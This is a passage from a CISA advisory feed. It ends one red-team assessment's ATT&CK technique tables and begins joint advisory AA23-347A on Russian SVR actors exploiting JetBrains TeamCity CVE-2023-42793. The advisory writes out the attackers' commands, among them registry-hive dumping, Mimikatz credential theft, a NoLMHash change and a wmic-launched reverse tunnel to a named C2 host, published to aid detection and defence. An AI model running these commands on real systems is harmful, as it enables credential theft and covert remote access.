role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr><tr><td>\n<p>LLMNR/NBT-NS Poisoning and Relay</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1557/001/\" title=\"Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay\">T1557.001</a></p>\n</td>\n<td>\n<p>The CISA team initiated a LLMNR/NBT-NS/mDNS/DHCP poisoning tool to spoof a connection to the organization’s server for forced access.</p>\n</td>\n</tr><tr><td>\n<p>Brute Force: Password Cracking</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1110/002/\" title=\"Brute Force: Password Cracking\">T1110.002</a></p>\n</td>\n<td>\n<p>The CISA team cracked a service account with a weak password, giving them access to it.</p>\n</td>\n</tr><tr><td>\n<p>Steal or Forge Kerberos Tickets: Kerberoasting</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1558/003/\" title=\"Steal or Forge Kerberos Tickets: Kerberoasting\">T1558.003</a></p>\n</td>\n<td>\n<p>The CISA team gained access to domain accounts because any domain user can request a TGS ticket for domain accounts.</p>\n</td>\n</tr><tr><td>\n<p>Adversary-in-the-Middle</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1557/001/\" title=\"Adversary-in-the-Middle\">T1557</a></p>\n</td>\n<td>\n<p>The CISA team modified the “Save as file” configuration, to use File Transfer Protocol (FTP) instead of Server Message Block (SMB) and changed the Server Name and Network Path to point to a CISA-controlled machine running Responder.</p>\n</td>\n</tr><tr><td>\n<p>Forced Authentication</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1187/\" title=\"Forced Authentication\">T1187</a></p>\n</td>\n<td>\n<p>The CISA team executed a “Connection Test” that sent the username and password over FTP.</p>\n</td>\n</tr><tr><td>\n<p>Steal or Forge Authentication Certificates</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1649/\" title=\"Steal or Forge Authentication Certificates\">T1649</a></p>\n</td>\n<td>\n<p>The CISA team used <code>Certipy</code> to enumerate the ADCS certificate template vulnerabilities, allowing them to obtain certificates for different users.</p>\n</td>\n</tr><tr><td>\n<p>OS Credential Dumping</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a></p>\n</td>\n<td>\n<p>The CISA team retrieved the NTLM hash for ACCOUNT 3.</p>\n</td>\n</tr><tr><td>\n<p>Use Alternate Authentication Material: Pass the Hash</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1550/002/\" title=\"Use Alternate Authentication Material: Pass the Hash\">T1550.002</a></p>\n</td>\n<td>\n<p>The CISA team used the hash to authenticate to the domain controller and validated Domain Administrator privileges, demonstrating compromise of the domain.</p>\n</td>\n</tr><tr><td>\n<p>Brute Force: Password Spraying</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1110/003\" title=\"Brute Force: Password Spraying\">T1110.003</a></p>\n</td>\n<td>\n<p>The CISA team used a tool called <code>CrackMapExec</code> to spray easily guessable passwords across all domain accounts, giving them two sets of valid credentials.</p>\n</td>\n</tr><tr><td>\n<p>Steal or Forge Kerberos Tickets</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1558/003/\" title=\"Steal or Forge Kerberos Tickets\">T1558</a></p>\n</td>\n<td>\n<p>The CISA team used this certificate to acquire a TGT for ACCOUNT 5.</p>\n</td>\n</tr><tr><td>\n<p>OS Credential Dumping: DCSync</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/006\" title=\"OS Credential Dumping: DCSync\">T1003.006</a></p>\n</td>\n<td>\n<p>The CISA team used <code>DCSync</code> to dump the NTLM hash for ACCOUNT 3 (a Domain Administrator account), effectively leading to domain compromise.</p>\n</td>\n</tr><tr><td>\n<p>OS Credential Dumping: Security Account Manager</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/002/\" title=\"OS Credential Dumping: Security Account Manager\">T1003.002</a></p>\n</td>\n<td>\n<p>The CISA team dumped password hashes from a Security Account Manager (SAM) database.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 13: CISA Team ATT&amp;CK Techniques for Discovery</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Discovery</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\"> </th>\n<th scope=\"col\" role=\"columnheader\"> </th>\n</tr></thead><tbody><tr><th role=\"columnheader\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr><tr><td>\n<p>Network Sniffing</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1040/\" title=\"Network Sniffing\">T1040</a></p>\n</td>\n<td>\n<p>The CISA team spoofed a response to direct the victim host to a CISA-controlled machine on which Responder is running. </p>\n</td>\n</tr><tr><td>\n<p>Account Discovery: Domain Account</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1087/002/\" title=\"Account Discovery: Domain Account\">T1087.002</a></p>\n</td>\n<td>\n<p>The CISA team enumerated accounts with a Service Principal Name (SPN) set with their domain access.</p>\n</td>\n</tr><tr><td>\n<p>Network Service Scanning</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1046/\" title=\"Network Service Scanning\">T1046</a></p>\n</td>\n<td>\n<p>The CISA team canned the organization’s network to identify open web ports to see where they could leverage the default credentials they had.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 14: CISA Team ATT&amp;CK Techniques for Lateral Movement</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Lateral Movement</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\"> </th>\n<th scope=\"col\" role=\"columnheader\"> </th>\n</tr></thead><tbody><tr><th role=\"columnheader\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr><tr><td>\n<p>Remote Services</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1021/\" title=\"Remote Services\">T1021</a></p>\n</td>\n<td>\n<p>The CISA team exploited its Responder to perform malicious functions, such as stealing credentials or opening a session on a targeted host.</p>\n</td>\n</tr><tr><td>\n<p> SMB/Windows Admin Shares</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1021/002/\" title=\" SMB/Windows Admin Shares\">T1021.002</a></p>\n</td>\n<td>\n<p>The CISA team confirmed they compromised the domain because ACCOUNT 1 had <code>READ,WRITE</code> permissions over the <code>C$</code> administrative share.</p>\n</td>\n</tr><tr><td>\n<p>Taint Shared Content</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1080/\" title=\"Taint Shared Content\">T1080</a></p>\n</td>\n<td>\n<p>The CISA team found the device was configured with domain credentials to allow employees to save scanned documents to a network share.</p>\n</td>\n</tr><tr><td>\n<p>Exploitation of Remote Services</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1210/\" title=\"Exploitation of Remote Services\">T1210</a></p>\n</td>\n<td>\n<p>The CISA team then executed a well-known EternalBlue exploit and established a shell on the server.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 15: CISA Team ATT&amp;CK Techniques for Collection</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Collection</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\"> </th>\n<th scope=\"col\" role=\"columnheader\"> </th>\n</tr></thead><tbody><tr><th role=\"columnheader\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr><tr><td>\n<p>Data from Network Shared Drive</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1039/\" title=\"Data from Network Shared Drive\">T1039</a></p>\n</td>\n<td>\n<p>The CISA team obtained credentials for cleartext, hashes, and from files.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 16: CISA Team ATT&amp;CK Techniques for Impact</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Collection</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\"> </th>\n<th scope=\"col\" role=\"columnheader\"> </th>\n</tr></thead><tbody><tr><th role=\"columnheader\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr><tr><td>\n<p>System Shutdown/Reboot</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1529/\" title=\"System Shutdown/Reboot\">T1529</a></p>\n</td>\n<td>\n<p>The CISA team assessed that with ACCOUNT 1, they could use it to modify, power off, and/or delete critical virtual machines, including domain controllers and file servers.</p>\n</td>\n</tr></tbody></table><h3><strong>VERSION HISTORY</strong></h3>\n<p>December 14, 2023: Initial version.</p>\n","pubDate":"Wed, 13 Dec 2023 19:24:48 EST","dc:creator":"CISA","guid":{"@isPermaLink":"false","#text":"/node/20506"}},{"title":"Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally","link":"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a","description":"<h3><strong>SUMMARY</strong></h3>\n<p>The U.S. Federal Bureau of Investigation (FBI), U.S. Cybersecurity &amp; Infrastructure Security Agency (CISA), U.S. National Security Agency (NSA), Polish Military Counterintelligence Service (SKW), CERT Polska (CERT.PL), and the UK’s National Cyber Security Centre (NCSC) assess Russian Foreign Intelligence Service (SVR) cyber actors—also known as Advanced Persistent Threat 29 (APT 29), the Dukes, CozyBear, and NOBELIUM/Midnight Blizzard—are exploiting <a href=\"https://nvd.nist.gov/vuln/detail/cve-2023-42793\" title=\"CVE-2023-42793\">CVE-2023-42793</a> at a large scale, targeting servers hosting JetBrains TeamCity software since September 2023.</p>\n<p>Software developers use TeamCity software to manage and automate software compilation, building, testing, and releasing. If compromised, access to a TeamCity server would provide malicious actors with access to that software developer’s source code, signing certificates, and the ability to subvert software compilation and deployment processes—access a malicious actor could further use to conduct supply chain operations. Although the SVR used such access to compromise SolarWinds and its customers in 2020, limited number and seemingly opportunistic types of victims currently identified, indicate that the SVR has not used the access afforded by the TeamCity CVE in a similar manner. The SVR has, however, been observed using the initial access gleaned by exploiting the TeamCity CVE to escalate its privileges, move laterally, deploy additional backdoors, and take other steps to ensure persistent and long-term access to the compromised network environments.</p>\n<p>To bring Russia’s actions to public attention, the authoring agencies are providing information on the SVR’s most recent compromise to aid organizations in conducting their own investigations and securing their networks, provide compromised entities with actionable indicators of compromise (IOCs), and empower private sector cybersecurity companies to better detect and counter the SVR’s malicious actions. The authoring agencies recommend all organizations with affected systems that did not immediately apply available patches or workarounds to assume compromise and initiate threat hunting activities using the IOCs provided in this CSA. If potential compromise is detected, administrators should apply the incident response recommendations included in this CSA and report key findings to the FBI and CISA.</p>\n<p>Download the PDF version of this report:</p>\n\n\n\n\n\n<div class=\"c-file\">\n    <div class=\"c-file__download\">\n    <a href=\"/sites/default/files/2023-12/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally_0.pdf\" class=\"c-file__link\" target=\"_blank\">AA23-347A Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally</a>\n    <span class=\"c-file__size\">(PDF,       774.65 KB\n  )</span>\n  </div>\n</div>\n<p>For a downloadable copy of IOCs, see:</p>\n\n\n\n\n\n<div class=\"c-file\">\n    <div class=\"c-file__download\">\n    <a href=\"/sites/default/files/2023-12/AA23-347A.stix__1.xml\" class=\"c-file__link\" target=\"_blank\">AA23-347A STIX XML</a>\n    <span class=\"c-file__size\">(XML,       76.99 KB\n  )</span>\n  </div>\n</div>\n\n\n\n\n\n<div class=\"c-file\">\n    <div class=\"c-file__download\">\n    <a href=\"/sites/default/files/2023-12/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.json\" class=\"c-file__link\" target=\"_blank\">AA23-347A STIX JSON</a>\n    <span class=\"c-file__size\">(JSON,       69.29 KB\n  )</span>\n  </div>\n</div>\n<h3><strong>THREAT OVERVIEW</strong></h3>\n<p>SVR cyber operations pose a persistent threat to public and private organizations’ networks globally. Since 2013, cybersecurity companies and governments have reported on SVR operations targeting victim networks to steal confidential and proprietary information. A decade later, the authoring agencies can infer a long-term targeting pattern aimed at collecting, and enabling the collection of, foreign intelligence, a broad concept that for Russia encompasses information on the politics, economics, and military of foreign states; science and technology; and foreign counterintelligence. The SVR also conducts cyber operations targeting technology companies that enable future cyber operations.</p>\n<p>A decade ago, public reports about SVR cyber activity focused largely on the SVR’s spear phishing operations, targeting government agencies, think tanks and policy analysis organizations, educational institutions, and political organizations. This category of targeting is consistent with the SVR’s responsibility to collect political intelligence, the collection of which has long been the SVR’s highest priority. For the Russian Government, political intelligence includes not only the development and execution of foreign policies, but also the development and execution of domestic policies and the political processes that drive them. In December 2016, the U.S. Government published a Joint Analysis Report titled “GRIZZLY STEPPE – Russian Malicious Cyber Activity,” which describes the SVR’s compromise of a U.S. political party leading up to a presidential election. The SVR’s use of spear phishing operations are visible today in its ongoing Diplomatic Orbiter campaign, primarily targeting diplomatic agencies. In 2023, SKW and CERT.PL published a Joint Analysis Report describing tools and techniques used by the SVR to target embassies in dozens of countries.</p>\n<p>Less frequently, reporting on SVR cyber activity has addressed other aspects of the SVR’s foreign intelligence collection mission. In July 2020, U.S., U.K., and Canadian Governments jointly published an advisory revealing the SVR’s exploitation of CVEs to gain initial access to networks, and its deployment of custom malware known as WellMess, WellMail, and Sorefang to target organizations involved in COVID-19 vaccine development. Although not listed in the 2020 advisory did not mention it, the authoring agencies can now disclose that the SVR’s WellMess campaign also targeted energy companies. Such biomedical and energy targets are consistent with the SVR’s responsibility to support the Russian economy by pursuing two categories of foreign intelligence known as economic intelligence and science and technology.</p>\n<p>In April 2021, the U.S. Government attributed a supply chain operation targeting the SolarWinds information technology company and its customers to the SVR. This attribution marked the discovery that the SVR had, since at least 2018, expanded the range of its cyber operations to include the widespread targeting of information technology companies. At least some of this targeting was aimed at enabling additional cyber operations. Following this attribution, the U.S. and U.K. Governments published advisories highlighting additional SVR TTPs, including its exploitation of various CVEs, the SVR’s use of “low and slow” password spraying techniques to gain initial access to some victims’ networks, exploitation of a zero-day exploit, and exploitation of Microsoft 365 cloud environments.</p>\n<p>In this newly attributed operation targeting networks hosting TeamCity servers, the SVR demonstrably continues its practice of targeting technology companies. By choosing to exploit CVE-2023-42793, a software development program, the authoring agencies assess the SVR could benefit from access to victims, particularly by allowing the threat actors to compromise the networks of dozens of software developers. JetBrains issued a patch for this CVE in mid-September 2023, limiting the SVR’s operation to the exploitation of unpatched, Internet-reachable TeamCity servers. While the authoring agencies assess the SVR has not yet used its accesses to software developers to access customer networks and is likely still in the preparatory phase of its operation, having access to these companies’ networks presents the SVR with opportunities to enable hard-to- detect command and control (C2) infrastructure.</p>\n<h3><strong>TECHNICAL DETAILS</strong></h3>\n<p><strong>Note:</strong> This advisory uses the <a href=\"https://attack.mitre.org/versions/v14/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK<sup>®</sup> for Enterprise</a> framework, version 14. See the MITRE ATT&amp;CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK<sup>®</sup> tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>. While SVR followed a similar playbook in each compromise, they also adjusted to each operating environment and not all presented steps or actions below were executed on every host.</p>\n<h4><em><strong>Initial Access - Exploitation</strong></em></h4>\n<p>The SVR started to exploit Internet-connected JetBrains TeamCity servers [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a>] in late September 2023 using CVE-2023-42793, which enables the insecure handling of specific paths allowing for bypassing authorization, resulting in arbitrary code execution on the server. The authoring agencies' observations show that the TeamCity exploitation usually resulted in code execution [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1203/\" title=\"Exploitation for Client Execution\">T1203</a>] with high privileges granting the SVR an advantageous foothold in the network environment. The authoring agencies are not currently aware of any other initial access vector to JetBrains TeamCity currently being exploited by the SVR.</p>\n<h4><em><strong>Host Reconnaissance</strong></em></h4>\n<p>Initial observations show the SVR used the following basic, built-in commands to perform host reconnaissance [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1033/\" title=\"System Owner/User Discovery\">T1033</a>],[<a href=\"https://attack.mitre.org/versions/v14/techniques/T1059/003/\" title=\"Command and Scripting Interpreter: Windows Command Shell\">T1059.003</a>],[<a href=\"https://attack.mitre.org/versions/v14/techniques/T1592/002/\" title=\"Gather Victim Host Information: Software\">T1592.002</a>]:</p>\n<ul><li>whoami /priv</li>\n<li>whoami /all</li>\n<li>whoami /groups</li>\n<li>whoami /domain</li>\n<li>nltest -dclist</li>\n<li>nltest -dsgetdc</li>\n<li>tasklist</li>\n<li>netstat</li>\n<li>wmic /node:\"\"&lt;redacted&gt;\"\" /user:\"\"&lt;redacted&gt;\"\" /password:\"\"&lt;redacted&gt;\"\" process list brief</li>\n<li>wmic /node:\"\"&lt;redacted&gt;\"\" process list brief</li>\n<li>wmic process get commandline -all</li>\n<li>wmic process &lt;proc_id&gt; get commandline</li>\n<li>wmic process where name=\"\"GoogleCrashHandler64.exe\"\" get commandline,processed</li>\n<li>powershell ([adsisearcher]\"((samaccountname=&lt;redacted&gt;))\").Findall().Properties</li>\n<li>powershell ([adsisearcher]\"((samaccountname=&lt;redacted&gt;))\").Findall().Properties.memberof</li>\n<li>powershell Get-WmiObject -Class Win32_Service -Computername</li>\n<li>powershell Get-WindowsDriver -Online -All</li>\n</ul><h4><strong><em>File Exfiltration</em></strong></h4>\n<p>Additionally, the authoring agencies have observed the SVR exfiltrating files [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1041/\" title=\"Exfiltration Over C2 Channel\">T1041</a>] which may provide insight into the host system’s operating system:</p>\n<ul><li>C:\\Windows\\system32\\ntoskrnl.exe to precisely identify system version, likely as a prerequisite to deploy EDRSandBlast.</li>\n<li>SQL Server executable files - based on the review of the post exploitation actions, the SVR showed an interest in specific files of the SQL Server installed on the compromised systems:\n<ul><li>C:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqlmin.dll,</li>\n<li>C:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqllos.dll,</li>\n<li>C:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqllang.dll,</li>\n<li>C:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqltses.dll</li>\n<li>C:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\secforwarder.dll</li>\n</ul></li>\n</ul><ul><li>Visual Studio files – based on the review of the post exploitation actions, the SVR showed an interest in specific files of the Visual Studio:\n<ul><li>C:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\SQL\\Common7\\IDE\\VSIXAutoUpdate.exe</li>\n<li>Update management agent files – based on the review of the post exploitation actions, the SVR showed an interest in executables and configuration of patch management software:\n<ul><li>C:\\Program Files (x86)\\PatchManagementInstallation\\Agent\\12\\Httpd\\bin\\httpd.exe</li>\n<li>C:\\Program Files (x86)\\PatchManagementInstallation\\Agent\\12\\Httpd</li>\n<li>C:\\ProgramData\\GFI\\LanGuard 12\\HttpdConfig\\httpd.conf</li>\n</ul></li>\n</ul></li>\n</ul><h4><em><strong>Interest in SQL Server</strong></em></h4>\n<p>Based on the review of the exploitation, the SVR also showed an interest in details of the SQL Server [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a>],[<a href=\"https://attack.mitre.org/versions/v14/techniques/T1505/001/\" title=\"Server Software Component: SQL Stored Procedures\">T1505.001</a>]:</p>\n<ul><li>powershell Compress-Archive -Path \"C:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqlmin.dll\",\"C:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqllos.dll\",\"C:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqllang.dll\",\"C:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqltses.dll\" -DestinationPath C:\\Windows\\temp\\1\\sql.zip</li>\n<li>SVR cyber actors also exfiltrated secforwarder.dll</li>\n</ul><h4><em><strong>Tactics Used to Avoid Detection</strong></em></h4>\n<p>To avoid detection, the SVR used a “Bring Your Own Vulnerable Driver” [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1068/\">T1068</a>] technique to disable or outright kill endpoint detection and response (EDR) and antivirus (AV) software [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a>].</p>\n<p>This was done using an open source project called “EDRSandBlast.” The authoring agencies have observed the SVR using EDRSandBlast to remove protected process light (PPL) protection, which is used for controlling and protecting running processes and protecting them from infection. The actors then inject code into AV/EDR processes for a small subset of victims [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1068/\">T1068</a>]. Additionally, executables that are likely to be detected (i.e. Mimikatz) were executed in memory [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/001/\">T1003.001</a>].</p>\n<p>In several cases SVR attempted to hide their backdoors via:</p>\n<ul><li>Abusing a DLL hijacking vulnerability in Zabbix software by replacing a legitimate Zabbix DLL with their one containing GraphicalProton backdoor,</li>\n<li>Backdooring an open source application developed by Microsoft named vcperf. SVR modified and copied publicly available sourcecode. After execution, backdoored vcperf dropped several DLLs to disc, one of those being a GraphicalProton backdoor,</li>\n<li>Abusing a DLL hijacking vulnerability in Webroot antivirus software by replacing a legitimate DLL with one containing GraphicalProton backdoor.</li>\n</ul><p>To avoid detection by network monitoring, the SVR devised a covert C2 channel that used Microsoft OneDrive and Dropbox cloud services. To further enable obfuscation, data exchanged with malware via OneDrive and Dropbox were hidden inside randomly generated BMP files [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1564/\" title=\"Hide Artifacts\">T1564</a>], illustrated below:</p>\n  \n  \n  \n  \n<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\"><div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2023-12/Picture%201%20-%20Randomly%20Generated%20BMP%20Files.png?itok=DaN0PY_Y\" width=\"404\" height=\"118\" alt=\"Picture 1 - Randomly Generated BMP Files\" /></div>\n  </figure><h4><em><strong>Privilege Escalation</strong></em></h4>\n<p>To facilitate privilege escalation [<a href=\"//attack.mitre.org/versions/v14/techniques/T1098/\">T1098</a>], the SVR used multiple techniques, including WinPEAS, NoLMHash registry key modification, and the Mimikatz tool.</p>\n<p>The SVR modified the NoLMHash registry using the following reg command:</p>\n<ul><li>reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v NoLMHash /t REG_DWORD /d \"0\" /f</li>\n</ul><p>The SVR used the following Mimikatz commands [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a>]:</p>\n<ul><li>privilege::debug</li>\n<li>lsadump::cache</li>\n<li>lsadump::secrets</li>\n<li>lsadump::sam</li>\n<li>sekurlsa::logonpasswords</li>\n</ul><h4><em><strong>Persistence</strong></em></h4>\n<p>The SVR relied on scheduled tasks [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1053/005/\" title=\"Scheduled Task/Job: Scheduled Task\">T1053.005</a>] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:</p>\n<ul><li>C:\\Windows\\temp</li>\n<li>C:\\Windows\\System32</li>\n<li>C:\\Windows\\WinStore</li>\n</ul><p>The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments passed to schtasks.exe, which can be found in <strong>Appendix B – Indicators of Compromise</strong>.</p>\n<p>To secure long-term access to the environment, the SVR used the Rubeus toolkit to craft Ticket Granting Tickets (TGTs) [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1558/001/\" title=\"Steal or Forge Kerberos Tickets: Golden Ticket\">T1558.001</a>].</p>\n<h4><em><strong>Sensitive Data Exfiltration [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1020/\" title=\"Automated Exfiltration\">T1020</a>]</strong></em></h4>\n<p>The SVR exfiltrated the following Windows Registry hives from its victims [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/001/\" title=\"OS Credential Dumping: LSASS Memory\">T1003</a>]:</p>\n<ul><li>HKLM\\SYSTEM</li>\n<li>HKLM\\SAM</li>\n<li>HKLM\\SECURITY</li>\n</ul><p>In order to exfiltrate Windows Registry, the SVR saved hives into files [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/002/\" title=\"OS Credential Dumping: Security Account Manager\">T1003.002</a>], packed them, and then exfiltrated them using a backdoor capability. it used “reg save” to save SYSTEM, SAM and SECURITY registry hives, and used powershell to stage .zip archives in the C:\\Windows\\Temp\\ directory.</p>\n<ul><li>reg save HKLM\\SYSTEM \"\"C:\\Windows\\temp\\1\\sy.sa\"\" /y</li>\n<li>reg save HKLM\\SAM \"\"C:\\Windows\\temp\\1\\sam.sa\"\" /y</li>\n<li>reg save HKLM\\SECURITY \"\"C:\\Windows\\temp\\1\\se.sa\"\" /y</li>\n<li>powershell Compress-Archive -Path C:\\Windows\\temp\\1\\ -DestinationPath C:\\Windows\\temp\\s.zip -Force &amp; del C:\\Windows\\temp\\1 /F /Q</li>\n</ul><p>In a few specific cases, the SVR used the SharpChromium tool to obtain sensitive browser data such as session cookies, browsing history, or saved logins.</p>\n<p>SVR also used DSInternals open source tool to interact with Directory Services. DSInternals allows to obtain a sensitive Domain information.</p>\n<h4><strong><em>Network Reconnaissance</em></strong></h4>\n<p>After the SVR built a secure foothold and gained an awareness of a victim’s TeamCity server, it then focused on network reconnaissance [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1590/004/\" title=\"Gather Victim Network Information: Network Topology\">T1590.004</a>]. The SVR performed network reconnaissance using a mix of built-in commands and additional tools, such as port scanner and PowerSploit, which it launched into memory [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1046/\">T1046</a>]. The SVR executed the following PowerSploit commands:</p>\n<ul><li>Get-NetComputer</li>\n<li>Get-NetGroup</li>\n<li>Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount\"</li>\n<li>Get-NetDiDomain</li>\n<li>Get-AdUser</li>\n<li>Get-DomainUser -UserName</li>\n<li>Get-NetUser -PreauthNotRequire</li>\n<li>Get-NetComputer | select samaccountname</li>\n<li>Get-NetUser -SPN | select serviceprincipalname</li>\n</ul><h4><em><strong>Tunneling into Compromised Environments</strong></em></h4>\n<p>In selected environments the SVR used an additional tool named, “rr.exe”—a modified open source reverse socks tunneler named Rsockstun—to establish a tunnel to the C2 infrastructure [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>].</p>\n<p>The authoring agencies are aware of the following infrastructure used in conjunction with “rr.exe”:</p>\n<ul><li>65.20.97[.]203:443</li>\n<li>Poetpages[.]com:8443</li>\n</ul><p>The SVR executed Rsockstun either in memory or using the Windows Management Instrumentation Command Line (WMIC) [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1047/\" title=\"Windows Management Instrumentation\">T1047</a>] utility after dropping it to disk:</p>\n<ul><li>wmic process call create \"C:\\Program Files\\Windows Defender Advanced Threat Protection\\Sense.exe -connect poetpages.com -pass M554-0sddsf2@34232fsl45t31\"</li>\n</ul><h4><em><strong>Lateral Movement</strong></em></h4>\n<p>The SVR used WMIC to facilitate lateral movement [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1047/\" title=\"Windows Management Instrumentation\">T1047</a>],[<a 